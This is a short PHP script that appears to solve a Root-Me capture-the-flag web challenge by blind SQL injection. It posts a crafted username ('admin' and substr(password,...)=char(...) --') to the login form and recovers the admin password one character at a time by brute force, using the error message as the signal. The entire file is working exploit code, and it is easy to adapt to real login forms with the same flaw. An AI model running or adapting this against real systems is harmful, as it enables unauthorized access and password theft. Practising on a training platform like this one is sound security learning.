<?php
require_once "./getLength.php";

$url = "http://challenge01.root-me.org/web-serveur/ch10/";
$password = "";
$i = 8;

//Plage des caractères ASCII à balayer
$borne_inf = 48;
$borne_sup = 123;

//Initialisation
$code = $borne_inf;

while ($i <= getLength()) {
    $data = array(
        'username' => "admin' and substr(password,$i,1)=char($code) --",
        'password' => 'secret'
    );
    $query = http_build_query($data);
    $context = stream_context_create(array(
        'http' => array(
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => $query
        )
    ));
    $response = file_get_contents($url, false, $context);
    if (!str_contains($response, "Error : no such user/password")) {
        $password .= chr($code);
        $i++;
        $code = $borne_inf;
    } else {
        $code++;
    }
}
echo "password : " . $password;